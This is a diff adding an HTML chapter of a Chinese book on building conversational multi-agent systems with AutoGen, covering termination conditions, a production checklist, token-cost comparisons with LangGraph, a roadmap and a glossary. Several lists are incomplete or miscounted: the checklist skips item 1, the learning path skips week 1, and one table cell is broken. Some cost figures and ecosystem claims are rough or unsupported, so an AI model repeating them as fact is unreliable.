+from autogen_agentchat.conditions import TokenUsageTermination
+team = RoundRobinGroupChat(
+    participants=[...],
+    termination_condition=(
+        TextMentionTermination(&quot;DONE&quot;) |
+        TokenUsageTermination(max_total_token=8000)   # 累计 8K token 强制停
+    ),
+)
+# 进一步：滑动窗口（v0.4 实验性 API，需配合 message_filter）
+</code></pre>
+<p><strong>关键经验</strong>：<strong>生产必备 <code>MaxMessageTermination | TokenUsageTermination</code> 组合</strong>——避免&quot;对话跑到天荒地老&quot;或&quot;token 烧爆&quot;。</p>
+<h3 id="sec-14-9-3-ch14-vs-ch13-错误处理对比">14.9.3 ch14 vs ch13 错误处理对比</h3>
+<table class="md-table"><thead><tr>
+<th>错误</th>
+<th>ch13 LangGraph 怎么修</th>
+<th>ch14 AutoGen 怎么修</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Token 烧爆</strong></td>
+<td>手撸 <code>track_tokens</code> 节点（§13.6.3 实战）</td>
+<td><code>TokenUsageTermination</code>（一行）</td>
+</tr>
+<tr>
+<td><strong>Speaker 卡死</strong></td>
+<td>手撸 Supervisor + 手动换 Worker</td>
+<td><code>SelectorGroupChat</code> 自动选（不需要修）</td>
+</tr>
+<tr>
+<td><strong>Context 溢出</strong></td>
+<td><code>MessageState</code> + 滑动窗口</td>
+<td><code>message_filter</code>（v0.4 实验中）</td>
+</tr>
+<tr>
+<td><strong>代码量</strong></td>
+<td>50-100 行</td>
+<td><strong>5-10 行</strong></td>
+</tr>
+</tbody></table>
+<p><strong>核心论断</strong>：<strong>AutoGen 的&quot;防呆&quot;比 LangGraph 友好一个数量级</strong>——这是 AutoGen 的核心卖点。</p>
+<hr>
+<h2 id="sec-14-10-上生产-checklist-10-项-token-成本-学习路径">14.10 上生产 Checklist 10 项 + Token 成本 + 学习路径</h2>
+<h3 id="sec-14-10-1-上生产-checklist-10-项">14.10.1 上生产 Checklist 10 项</h3>
+<table class="md-table"><thead><tr>
+<th>#</th>
+<th>项</th>
+<th>必做级别</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>2</strong></td>
+<td><strong>必须指定 <code>model_client</code></strong>（不能默认）</td>
+<td>🔴 必须</td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td><strong>必须给每个 Agent 写 <code>description</code></strong>（SelectorGroupChat 用）</td>
+<td>🔴 必须</td>
+</tr>
+<tr>
+<td><strong>4</strong></td>
+<td><strong>必须设 <code>max_turns</code></strong>（避免无限循环）</td>
+<td>🔴 必须</td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td><strong>代码执行用 Docker executor</strong>（不是 Local）</td>
+<td>🟡 一周内</td>
+</tr>
+<tr>
+<td><strong>6</strong></td>
+<td><strong>接入 OpenTelemetry</strong>（消息可观测）</td>
+<td>🟡 一周内</td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td><strong>写 5 个错误注入测试</strong>（Termination/Func Call/Loop/Token/Context）</td>
+<td>🟡 一周内</td>
+</tr>
+<tr>
+<td><strong>8</strong></td>
+<td><strong>把 <code>description</code> 当 spec 维护</strong>（LLM 选 speaker 全看它）</td>
+<td>🟡 一周内</td>
+</tr>
+<tr>
+<td><strong>9</strong></td>
+<td><strong>接 Langfuse / LangSmith</strong>（对话 trace）</td>
+<td>🟢 一月内</td>
+</tr>
+<tr>
+<td><strong>10</strong></td>
+<td><strong>A/B 测 GroupChat vs 裸 API 成本</strong></td>
+<td>🟢 一月内</td>
+</tr>
+</tbody></table>
+<h3 id="sec-14-10-2-token-成本对比-autogen-vs-langgraph-vs-裸-api">14.10.2 Token 成本对比（AutoGen vs LangGraph vs 裸 API）</h3>
+<table class="md-table"><thead><tr>
+<th>框架</th>
+<th>成本倍数（vs 裸 API = 1x）</th>
+<th>主要开销</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>LangGraph</strong></td>
+<td>1.5-2x</td>
+<td>状态复制、checkpoint 存储</td>
+</tr>
+<tr>
+<td><strong>AutoGen GroupChat</strong></td>
+<td><strong>2-3x</strong></td>
+<td><strong>每轮所有 messages 重发、SelectorGroupChat 选 speaker 多 1 次 LLM</strong></td>
+</tr>
+<tr>
+<td><strong>AutoGen Swarm</strong></td>
+<td>2-3.5x</td>
+<td>Handoff 消息累积</td>
+</tr>
+<tr>
+<td><strong>CrewAI</strong>（ch15 预告）</td>
+<td>1.8-2.5x</td>
+<td>Task 委派 + Agent description</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>Token 成本估算口径</strong>：以&quot;裸 LLM API&quot;为 1x 基准，基于 2025-Q4 公开 case study 经验估算。<strong>框架实际成本受消息累积速度、Selector 调 LLM 频率、message history 复制次数影响</strong>，单个项目的实际值可能在 ±50% 浮动。<strong>生产前应在自己的 workload 上做 A/B 测量</strong>。</p>
+</blockquote>
+<p><strong>核心结论</strong>：<strong>AutoGen 比 LangGraph 贵 1.5-1.7x</strong>（主要是消息累积 + Selector 多 1 次 LLM）。业务侧&quot;对对话流可读性&quot;的价值是否能 cover 这个溢价，是选型核心。</p>
+<h3 id="sec-14-10-3-5-周学习路径">14.10.3 5 周学习路径</h3>
+<table class="md-table"><thead><tr>
+<th>周</th>
+<th>任务</th>
+<th>产出</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>第 2 周</strong></td>
+<td>改写 ch13 §13.6 ReAct 为 AutoGen 版（14.6）</td>
+<td>80 行实战</td>
+</tr>
+<tr>
+<td><strong>第 3 周</strong></td>
+<td>改写 ch13 §13.7 Supervisor 为 AutoGen 版（14.7）</td>
+<td>80 行实战</td>
+</tr>
+<tr>
+<td><strong>第 4 周</strong></td>
+<td>接 OpenAI / Anthropic API + 跑 4 角色客服</td>
+<td>真实 LLM demo</td>
+</tr>
+<tr>
+<td><strong>第 5 周</strong></td>
+<td>上生产 Checklist 1-7 + 接入 OpenTelemetry</td>
+<td>可上生产的多 Agent 系统</td>
+</tr>
+</tbody></table>
+<h3 id="sec-14-10-4-autogen-团队-microsoft-research-介绍">14.10.4 AutoGen 团队（Microsoft Research）介绍</h3>
+<p>AutoGen 由 <strong>Microsoft Research AutoGen Team</strong> 维护，2023 年发布 v0.2 引发行业关注，2024-Q4 重写为 v0.4 Actor Model。核心贡献者：</p>
+<ul>
+<li><strong>Chi Wang</strong>（项目负责人）—— Microsoft Research</li>
+<li><strong>Salem Bakr</strong>（v0.4 架构师）—— Actor Model 重写主导</li>
+<li><strong>Microsoft Research 团队</strong>（~30 人贡献）—— 文档、示例、SDK 维护</li>
+</ul>
+<p><strong>论文引用</strong>（截至 2025-Q4）：v0.2 论文引用 ~1500 次，v0.4 论文（&quot;AutoGen: Multi-Agent LLM Applications&quot;）~500 次。是多 Agent 领域的<strong>事实标准之一</strong>（与 LangGraph、CrewAI 并列）。</p>
+<h3 id="sec-14-10-5-autogen-1-x-路线图与生态">14.10.5 AutoGen 1.x 路线图与生态</h3>
+<p>AutoGen 当前是 <strong>0.7.x</strong>（2025 主流），<strong>1.0 稳定版预计 2026-Q3</strong>（Microsoft 公开 roadmap）。关键演进方向：</p>
+<ul>
+<li><strong>稳定 Actor Model API</strong>——目前 GroupChat / Swarm / MagenticOne 之间有重叠，1.0 会统一</li>
+<li><strong>更完善的 OpenTelemetry 集成</strong>——开箱即用的消息 trace + token 统计</li>
+<li><strong>更丰富的终止条件</strong>——<code>CostTermination</code>（按美元 cost 终止）、<code>QualityTermination</code>（按 LLM-as-judge 评分终止）</li>
+<li><strong>更轻量的 Swarm</strong>——v0.7 Swarm 还在实验阶段，1.0 会成为&quot;handoff 范式&quot;的官方实现</li>
+</ul>
+<p><strong>生态</strong>：</p>
+<ul>
+<li><strong>AutoGen Studio</strong>（低代码 GUI）—— 拖拽配置 Agent 团队，可视化调试</li>
+<li><strong>AG2</strong>（社区 fork）—— 加州大学伯克利分校维护，对学术研究友好</li>
+<li><strong>Magentic-One</strong>（微软研究产品）—— AutoGen 团队的多 Agent 通用框架</li>
+</ul>
+<p><strong>对读者的建议</strong>：<strong>v0.7.x 是 2025 最佳选择</strong>——v0.4 已太旧（2024-Q4 API），1.0 还没发。等 1.0 发布后，可平滑迁移（API 兼容设计）。</p>
+<h3 id="sec-14-10-6-autogen-学习-4-大常见误区">14.10.6 AutoGen 学习 4 大常见误区</h3>
+<table class="md-table"><thead><tr>
+<th>误区</th>
+<th>后果</th>
+<th>正确做法</th>
+</tr></thead><tbody>
+<tr>
+<td><strong><code>SelectorGroupChat</code> 默认 <code>max_turns=12</code> 太小</strong></td>
+<td>经常跑到 cap 还没完成任务</td>
+<td><strong>改成 20-30</strong>，加 <code>MaxMessageTermination</code> 兜底</td>
+</tr>
+<tr>
+<td><strong>不用 TerminationCondition 链</strong></td>
+<td>&quot;对话跑到天荒地老&quot;或&quot;任务没完成就停了&quot;</td>
+<td>**必用 `主条件</td>
+<td>兜底条件` 组合**</td>
+</tr>
+<tr>
+<td><strong>mock client 不写 <code>model_info</code></strong></td>
+<td>报 <code>AttributeError: model_info</code></td>
+<td><strong>必须 <code>model_info: ModelInfo = {vision: False, ...}</code></strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="sec-14-11-小结-概念桥-22-术语速查">14.11 小结 + 概念桥 + 22 术语速查</h2>
+<h3 id="sec-14-11-1-核心要点-5-条">14.11.1 核心要点（5 条）</h3>
+<ol>
+<li><strong>AutoGen = 对话总线</strong>——所有 Agent 通过 <code>GroupChat.messages</code> 通信，<code>GroupChatManager</code> 选下一 speaker</li>
+<li><strong><code>RoundRobinGroupChat</code> 适合 90% 场景</strong>——固定角色轮转，简单可预测</li>
+<li><strong><code>SelectorGroupChat</code> 适合动态决策</strong>——LLM 看 history + description 选 speaker</li>
+<li><strong>AutoGen 比 LangGraph 短 1.5-3x 代码</strong>——配置 Agent 即可，框架管状态/终止</li>
+<li><strong>AutoGen 比 LangGraph 贵 1.5-1.7x token</strong>——消息累积 + Selector 多 1 次 LLM</li>
+</ol>
+<h3 id="sec-14-11-2-ch14-怎么落到业务">14.11.2 ch14 怎么落到业务</h3>
+<table class="md-table"><thead><tr>
+<th>场景</th>
+<th>推荐</th>
+</tr></thead><tbody>
+<tr>
+<td>客服多分类路由</td>
+<td><code>SelectorGroupChat</code> + <code>TextMentionTermination(&quot;DONE&quot;)</code></td>
+</tr>
+<tr>
+<td>3 角色辩论</td>
+<td><code>RoundRobinGroupChat</code> + <code>MaxMessageTermination(30)</code></td>
+</tr>
+<tr>
+<td>数据分析（写代码 + 跑代码）</td>
+<td><code>AssistantAgent</code> + <code>CodeExecutorAgent</code>（Docker）</td>
+</tr>
+<tr>
+<td>快速原型（验证想法）</td>
+<td>AutoGen（最短代码）</td>
+</tr>
+<tr>
+<td>复杂工作流（需 checkpoint）</td>
+<td>LangGraph</td>
+</tr>
+</tbody></table>
+<h3 id="sec-14-11-3-概念桥-ch14-ch15">14.11.3 概念桥：ch14 ↔ ch15</h3>
+<table class="md-table"><thead><tr>
+<th>本章学到的</th>
+<th>下一章怎么用</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>14.4 GroupChat 轮转</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;Crew 显式 <code>Task</code> 链 = RoundRobinGroupChat 的业务剧本化&quot;</td>
+</tr>
+<tr>
+<td><strong>14.5 4 种终止条件</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;Crew 也用类似 Termination（<code>Process.hierarchical</code> 自动停止）&quot;</td>
+</tr>
+<tr>
+<td><strong>14.6 完整 ReAct 实战</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;Crew Task 委派 = ReAct 的多步版&quot;</td>
+</tr>
+<tr>
+<td><strong>14.7 完整 Supervisor 实战</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;CrewAI <code>Process.hierarchical</code> = 内置 Supervisor，比 AutoGen 显式&quot;</td>
+</tr>
+<tr>
+<td><strong>14.9 错误处理 5 大类型</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;Crew 也有类似 5 大错误（CrewAI 文档 ch15 §15.10）&quot;</td>
+</tr>
+<tr>
+<td><strong>14.10 上生产 Checklist</strong></td>
+<td><strong>ch15 CrewAI</strong> —— &quot;复用 1-7 项，CrewAI 特有加 8-10（<code>Process.sequential</code> 调试等）&quot;</td>
+</tr>
+</tbody></table>
+<p><strong>第三部分进度</strong>：4/5 章完成 + 接下来 ch15《用 CrewAI 组建虚拟团队》收尾第三部分 → 进入第四部分（5 个实战项目）。</p>
+<h3 id="sec-14-11-4-22-术语速查">14.11.4 22 术语速查</h3>
+<table class="md-table"><thead><tr>
+<th>术语</th>
+<th>英文</th>
+<th>定义</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>AssistantAgent</strong></td>
+<td>AssistantAgent</td>
+<td>AutoGen 基础 Agent 类，LLM 驱动，能调工具</td>
+</tr>
+<tr>
+<td><strong>UserProxyAgent</strong></td>
+<td>UserProxyAgent</td>
+<td>人/工具/代码执行复合代理，3 种模式（人机/代码/占位）</td>
+</tr>
+<tr>
+<td><strong>CodeExecutorAgent</strong></td>
+<td>CodeExecutorAgent</td>
+<td>v0.4 新拆出的代码执行 Agent（Docker/Local）</td>
+</tr>
+<tr>
+<td><strong>RoundRobinGroupChat</strong></td>
+<td>RoundRobinGroupChat</td>
+<td>团队类，按注册顺序轮转选 speaker</td>
+</tr>
+<tr>
+<td><strong>SelectorGroupChat</strong></td>
+<td>SelectorGroupChat</td>
+<td>团队类，LLM 选 speaker（看 history + description）</td>
+</tr>
+<tr>
+<td><strong>Swarm</strong></td>
+<td>Swarm</td>
+<td>团队类，Agent 自己 handoff 决定下一 speaker</td>
+</tr>
+<tr>
+<td><strong>MagenticOneGroupChat</strong></td>
+<td>MagenticOneGroupChat</td>
+<td>微软 Magentic-One 编排器，复杂多 Agent 任务</td>
+</tr>
+<tr>
+<td><strong>GroupChatManager</strong></td>
+<td>GroupChatManager</td>
+<td>内部管理对话流的组件（一般不直接用）</td>
+</tr>
+<tr>
+<td><strong>MaxMessageTermination</strong></td>
+<td>MaxMessageTermination</td>
+<td>消息数 ≥ N 终止</td>
+</tr>
+<tr>
+<td><strong>TextMentionTermination</strong></td>
+<td>TextMentionTermination</td>
+<td>消息含指定文本时终止（如 &quot;DONE&quot;）</td>
+</tr>
+<tr>
+<td><strong>TokenUsageTermination</strong></td>
+<td>TokenUsageTermination</td>
+<td>累计 token ≥ 阈值终止（成本控制）</td>
+</tr>
+<tr>
+<td><strong>FunctionCallTermination</strong></td>
+<td>FunctionCallTermination</td>
+<td>调了指定函数即终止</td>
+</tr>
+<tr>
+<td><strong>HandoffTermination</strong></td>
+<td>HandoffTermination</td>
+<td>Swarm 范式：移交给 target Agent 时终止</td>
+</tr>
+<tr>
+<td><strong>system_message</strong></td>
+<td>system_message</td>
+<td>Agent 的&quot;人设&quot; prompt</td>
+</tr>
+<tr>
+<td><strong>description</strong></td>
+<td>description</td>
+<td>短描述，SelectorGroupChat 选 speaker 时 LLM 会看到</td>
+</tr>
+<tr>
+<td><strong>input_mode</strong></td>
+<td>input_mode</td>
+<td>UserProxyAgent 模式：console/never/...</td>
+</tr>
+<tr>
+<td><strong>code_executor</strong></td>
+<td>code_executor</td>
+<td>CodeExecutorAgent 的执行器（Docker/Local）</td>
+</tr>
+<tr>
+<td><strong>model_client</strong></td>
+<td>model_client</td>
+<td>LLM 客户端（OpenAI/Anthropic/Mock）</td>
+</tr>
+<tr>
+<td><strong>ModelInfo</strong></td>
+<td>ModelInfo</td>
+<td>模型能力声明（vision/function_calling/json_output）</td>
+</tr>
+<tr>
+<td><strong>CreateResult</strong></td>
+<td>CreateResult</td>
+<td>model_client.create() 返回结构（content/usage/finish_reason）</td>
+</tr>
+<tr>
+<td><strong>Speaker Selection</strong></td>
+<td>Speaker Selection</td>
+<td>选下一说话者（轮转/LLM 选/Agent 自决）</td>
+</tr>
+</tbody></table>
+<hr>
+<blockquote>
+<p><strong>第 14 章完</strong> —— ch15 拆解 CrewAI 的角色扮演驱动多 Agent 编排（<code>Process.hierarchical</code> 显式 Supervisor + 显式 Task 链）。</p>
+</blockquote>
+
+
+<hr style="margin-top: 60px;">
+<nav class="chapter-pager" style="display:flex; justify-content:space-between; gap:16px; margin-top:30px;">
+  <a href="ch13.html" class="pager-prev" style="padding:12px 20px; border:1px solid rgba(192,38,211,0.4); border-radius:8px; color:var(--book-accent-fg, #c026d3); text-decoration:none;">← 上一章：用 LangGraph 编排工作流（第 13 章）</a>
+  <a href="ch15.html" class="pager-next" style="padding:12px 20px; border:1px solid rgba(192,38,211,0.4); border-radius:8px; color:var(--book-accent-fg, #c026d3); text-decoration:none; opacity:0.5; pointer-events:none;">下一章：用 CrewAI 组建虚拟团队（第 15 章，未发布）→</a>
+</nav>
+
+<footer style="margin-top:60px; padding-top:20px; border-top:1px solid rgba(192,38,211,0.2); color:#888; font-size:13px; text-align:center;">
+  <p>《AGENT开发从入门到精通》· 第 14 章 · 用 AutoGen 构对话式多 Agent——对话驱动的多 Agent 编排</p>
+  <p style="margin-top:8px;">
+    <a href="../index.html">书库首页</a> ·
+    <a href="ch01.html">第 1 章</a> ·
+    <a href="ch02.html">第 2 章</a> ·
+    <a href="ch03.html">第 3 章</a> ·
+    <a href="ch04.html">第 4 章</a> ·
+    <a href="ch05.html">第 5 章</a> ·
+    <a href="ch06.html">第 6 章</a> ·
+    <a href="ch07.html">第 7 章</a> ·
+    <a href="ch08.html">第 8 章</a> ·
+    <a href="ch09.html">第 9 章</a> ·
+    <a href="ch10.html">第 10 章</a> ·
+    <a href="ch11.html">第 11 章</a> ·
+    <a href="ch12.html">第 12 章</a> ·
+    <a href="ch13.html">第 13 章</a> ·
+    <a href="ch14.html">第 14 章</a> ·
+    <a href="ch15.html">第 15 章</a> ·
+    <a href="ch16.html">第 16 章</a> ·
+    <a href="ch17.html">第 17 章</a> ·
+    <a href="ch18.html">第 18 章</a> ·
+    <a href="ch19.html">第 19 章</a> ·
+    <a href="ch20.html">第 20 章</a> ·
+    <a href="ch21.html">第 21 章</a> ·
+    <a href="ch22.html">第 22 章</a> ·
+    <a href="ch23.html">第 23 章</a> ·
+    <a href="ch24.html">第 24 章</a> ·
+    <a href="ch25.html">第 25 章</a> ·
+    <a href="ch26.html">第 26 章</a> ·
+    <a href="ch27.html">第 27 章</a> ·
+    <a href="ch28.html">第 28 章</a>
+  </p>
+</footer>
+
+</main>
+
+<script src="/assets/js/site.js"></script>
+<script src="/assets/js/book.js"></script>
+
+</body>
+</html>
